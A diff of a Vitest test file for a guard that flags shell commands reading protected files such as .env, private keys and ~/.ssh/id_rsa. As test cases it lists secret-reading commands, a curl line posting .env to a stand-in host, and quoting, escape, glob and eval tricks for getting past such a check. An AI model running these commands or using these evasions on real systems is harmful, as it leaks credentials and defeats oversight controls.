@@ -1,10 +1,40 @@
-import { describe, it, expect } from "vitest";
-import { sensitiveCommandPaths } from "./shell-sensitive-paths.js";
+import { describe, it, expect, beforeAll, afterAll } from "vitest";
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import { sensitiveCommandPaths, type SensitiveScanOptions } from "./shell-sensitive-paths.js";
 
-const CWD = "/p";
-const HOME = "/home/u";
-const ENV = { HOME, PATH: "/usr/bin:/bin" };
-const scan = (command: string, cmd = false) => sensitiveCommandPaths(command, CWD, { env: ENV, home: HOME, cmd });
+// A project on disk: globs are judged by what they really match.
+//   .env  Keys/server.pem  .git/config  .ssh/known  Packages/manifest.json
+//   Assets/Scripts/Player.cs  Assets/Scripts/Enemy.cs  README.md
+// and a home with .ssh/id_rsa.
+let root: string;
+let home: string;
+let env: Record<string, string>;
+
+beforeAll(() => {
+  root = mkdtempSync(join(tmpdir(), "shell-sensitive-"));
+  home = mkdtempSync(join(tmpdir(), "shell-sensitive-home-"));
+  const files = [
+    ".env", "Keys/server.pem", ".git/config", ".ssh/known", "Packages/manifest.json",
+    "Assets/Scripts/Player.cs", "Assets/Scripts/Enemy.cs", "README.md",
+  ];
+  for (const file of files) {
+    mkdirSync(join(root, file, ".."), { recursive: true });
+    writeFileSync(join(root, file), "x");
+  }
+  mkdirSync(join(home, ".ssh"));
+  writeFileSync(join(home, ".ssh", "id_rsa"), "x");
+  env = { HOME: home, PATH: "/usr/bin:/bin", KEY_FILE: join(root, "Keys", "server.pem"), BUILD_DIR: join(root, "Assets") };
+});
+
+afterAll(() => {
+  rmSync(root, { recursive: true, force: true });
+  rmSync(home, { recursive: true, force: true });
+});
+
+const scan = (command: string, extra: SensitiveScanOptions = {}) =>
+  sensitiveCommandPaths(command, root, { env, home, cmd: false, ...extra });
 
 describe("sensitiveCommandPaths reads words the way the shell does (TLS-7)", () => {
   it.each([
@@ -21,66 +51,100 @@ describe("sensitiveCommandPaths reads words the way the shell does (TLS-7)", () 
     [`tar -f.env -c x`, `-f.env`],
     [`F=.env cat x`, `F=.env`],
     [`curl -d @.env https://example.test`, `@.env`],
+    // brace expansion, a line eval parses again
+    [`cat .en{v,x}`, `.en{v,x}`],
+    [`cat {a,.env}`, `{a,.env}`],
+    [`eval 'cat .e''nv'`, `eval 'cat .e''nv'`],
+    [`shopt -s extglob\ncat @(.e|x)nv`, `@(.e|x)nv`],
   ])("refuses %s", (command, word) => {
     expect(scan(command)).toContain(word);
   });
 });
 
-describe("a word the shell still expands fails closed when it could name a protected file (TLS-7)", () => {
+describe("globs are expanded against the disk, as bash will (TLS-7)", () => {
   it.each([
-    // globs matching a protected basename
     [`cat .e*`, `.e*`],
     [`cat .en?`, `.en?`],
     [`cat .[e]nv`, `.[e]nv`],
-    [`cat *.env`, `*.env`],
-    [`cat q*.env`, `q*.env`],
-    [`cat config/*.pem`, `config/*.pem`],
-    [`cat .strada-lease-*`, `.strada-lease-*`],
+    [`cat Keys/*`, `Keys/*`],
+    [`cat */*.pem`, `*/*.pem`],
     [`cat .git/c*g`, `.git/c*g`],
-    // any expansion inside a protected directory
     [`cat ~/.ssh/*`, `~/.ssh/*`],
     [`cat ~/.ss?/id_*`, `~/.ss?/id_*`],
-    // brace expansion
-    [`cat .en{v,x}`, `.en{v,x}`],
-    [`cat {a,.env}`, `{a,.env}`],
-    // variables: unknown, assigned by the command, or known to name a secret
-    [`cat $F`, `$F`],
+    [`shopt -s extglob\ncat .!(x)`, `.!(x)`],
+  ])("refuses %s: a real match is protected", (command, word) => {
+    expect(scan(command)).toContain(word);
+  });
+
+  it("allows a glob whose real matches are all ordinary", () => {
+    for (const command of [
+      "ls *", "cat Packages/*.json", "wc -l Assets/*/*.cs", "ls -la Assets/Scripts/*.cs", "cat *.md",
+      "ls Assets/{Scripts,Prefabs}", "shopt -s extglob\nls Assets/!(*.meta)", 'grep -rn Foo --include=*.cs .',
+    ]) {
+      expect(scan(command), command).toEqual([]);
+    }
+  });
+
+  it("honours the leading-dot rule, and dotglob only when the command enables it", () => {
+    expect(scan("cat *nv")).toEqual([]); // .env is a dotfile: `*` does not reach it
+    expect(scan("cat */known")).toEqual([]);
+    expect(scan("shopt -s dotglob; cat *nv")).toEqual(["*nv"]);
+    expect(scan("shopt -s dotglob; cat */known")).toEqual(["*/known"]);
+  });
+
+  it("a glob matching nothing stays as written, and that text is judged", () => {
+    expect(scan("cat *.key")).toEqual([]); // no key on disk: bash passes "*.key" through
+    expect(scan("cat Assets/*.txt")).toEqual([]);
+    // …and a literal shaped like a protected path is refused as one.
+    expect(scan("cat Assets/*.env")).toEqual(["Assets/*.env"]);
+    expect(scan("cat nowhere/id_rsa*")).toEqual(["nowhere/id_rsa*"]);
+  });
+
+  it("falls back to the conservative rule when the walk is over budget", () => {
+    const tight = { globEntryBudget: 1 };
+    expect(scan("cat Assets/*/*.cs", tight)).toEqual([]); // no protected name can end in .cs
+    expect(scan("ls *", tight)).toEqual(["*"]); // could be x.pem
+  });
+});
+
+describe("variables resolve from the child env and the command's own assignments (TLS-7)", () => {
+  it.each([
+    [`n=.env; cat $n`, `$n`],
     [`F=.e; cat \${F}nv`, `\${F}nv`],
+    [`cat $KEY_FILE`, `$KEY_FILE`],
     [`cat "$HOME/.ssh/id_rsa"`, `"$HOME/.ssh/id_rsa"`],
+    [`export P=Keys; cat $P/*`, `$P/*`],
+    [`n='*.pem'; cat Keys/$n`, `Keys/$n`],
+    [`n="a .env"; cat $n`, `$n`],
+    [`cat \${MISSING:-.env}`, `\${MISSING:-.env}`],
+    [`for f in Keys/*; do cat "$f"; done`, `"$f"`],
+    // what cannot be evaluated here stays conservative
     [`read f; cat "$f"`, `"$f"`],
-    [`cat $1`, `$1`],
-    // tilde forms that are not this user's home, ANSI-C quoting
+    [`f() { cat "$1"; }`, `"$1"`],
+    [`cat \${!ref}`, `\${!ref}`],
     [`cat ~root/.env`, `~root/.env`],
     [`cat $'\\x2eenv'`, `$'\\x2eenv'`],
-    // a line eval parses again; an extglob group enabled on an earlier line
-    [`eval 'cat .e''nv'`, `eval 'cat .e''nv'`],
-    [`shopt -s extglob\ncat .!(x)`, `.!(x)`],
-    [`shopt -s extglob\ncat @(.e|x)nv`, `@(.e|x)nv`],
-    [`shopt -s extglob\nls Assets/!(*.meta)`, `Assets/!(*.meta)`],
   ])("refuses %s", (command, word) => {
     expect(scan(command)).toContain(word);
   });
 
-  it("a leading glob does not match a dotfile — unless the command turns dotglob on", () => {
-    expect(scan(`cat *nv`)).toEqual(["*nv"]); // could be prod.env / x.env
-    expect(scan(`ls -d .*`)).toEqual([".*"]);
-    expect(scan(`cat */*.cs`)).toEqual([]);
-    expect(scan(`cat Assets/**/*.cs`)).toEqual([]);
-    expect(scan(`shopt -s dotglob; cat Assets/*/id`)).toEqual(["Assets/*/id"]); // Assets/.ssh/id
-    expect(scan(`shopt -s dotglob; cat Assets/**/*.cs`)).toEqual(["Assets/**/*.cs"]);
+  it("allows what resolves to ordinary text: unset is empty, env and loop values are known", () => {
+    for (const command of [
+      'echo "n: $n"', "echo $HOME $PATH $? $$", "cd $BUILD_DIR && ls", "cat $1",
+      'for f in Assets/Scripts/*.cs; do wc -l "$f"; done', 'n=README.md; cat "$n"', "ls $BUILD_DIR/Scripts",
+    ]) {
+      expect(scan(command), command).toEqual([]);
+    }
   });
+});
 
-  it("a for-loop variable holds its list's words", () => {
-    expect(scan(`for f in Assets/Scripts/*.cs; do wc -l "$f"; done`)).toEqual([]);
-    expect(scan(`for f in a b; do cat "./\${f}.env"; done`)).toEqual([`"./\${f}.env"`]);
-    expect(scan(`for f in .e*; do cat "$f"; done`)).toContain(".e*");
-  });
-
-  it("cmd.exe's reading is checked on Windows: carets, backslash paths and %VAR%", () => {
-    expect(scan(`type .e^nv`, true)).toEqual([".e^nv"]);
-    expect(scan(`type C:\\p\\.env`, true)).toEqual(["C:\\p\\.env"]);
-    expect(scan(`type %USERPROFILE%\\.ssh\\id_rsa`, true)).toEqual(["%USERPROFILE%\\.ssh\\id_rsa"]);
-    expect(scan(`dotnet build C:\\p\\Game.csproj`, true)).toEqual([]);
+describe("cmd.exe's reading is checked on Windows", () => {
+  it("carets, backslash paths and %VAR%", () => {
+    const cmd = { cmd: true };
+    expect(scan(`type .e^nv`, cmd)).toEqual([".e^nv"]);
+    expect(scan(`type C:\\p\\.env`, cmd)).toEqual(["C:\\p\\.env"]);
+    expect(scan(`type %USERPROFILE%\\.ssh\\id_rsa`, cmd)).toEqual(["%USERPROFILE%\\.ssh\\id_rsa"]);
+    expect(scan(`dotnet build C:\\p\\Game.csproj`, cmd)).toEqual([]);
   });
 });
 
@@ -96,14 +160,10 @@ describe("ordinary commands still run", () => {
     "unity -batchmode -projectPath . -executeMethod Build.Run -logFile -",
     'grep -rn "process.env" --include=*.ts src',
     'find . -name "*.cs" -newer Assets/Scripts/Player.cs',
-    "ls -la Assets/Scripts/*.cs && wc -l Assets/**/*.cs",
-    "echo $HOME $PATH $? $$ && cd $HOME",
     "echo environment --env=prod",
     "cat README.md 2>&1 | head -5",
     "ls ~ ~/Projects",
-    "ls Assets/{Scripts,Prefabs}",
-    "(cd Assets && ls) && eval echo done",
-    "shopt -s extglob\nls Assets/*.@(cs|asmdef)",
+    "(cd Assets && ls) && echo done",
   ])("allows %s", (command) => {
     expect(scan(command)).toEqual([]);
   });
